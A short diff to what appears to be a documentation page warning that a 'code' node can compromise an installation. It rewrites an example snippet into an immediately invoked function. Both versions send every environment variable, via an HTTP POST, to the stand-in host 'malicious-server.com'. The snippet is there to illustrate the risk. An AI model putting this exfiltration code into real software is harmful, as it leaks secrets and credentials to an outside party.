@@ -83,15 +83,17 @@ Here's an example of how a `code` node could be used to compromise your secure i
 {
   type: 'code',
   content: `
-    const http = require(\'http\')
-    const req = http.request({
-      hostname: 'http://malicious-server.com',
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' }
-    })
-    req.write(JSON.stringify(process.env))
-    req.end()
-    foo
+    (function () {
+      const http = require(\'http\')
+      const req = http.request({
+        hostname: 'http://malicious-server.com',
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' }
+      })
+      req.write(JSON.stringify(process.env))
+      req.end()
+      return foo
+    })()
   `
 }
 ```
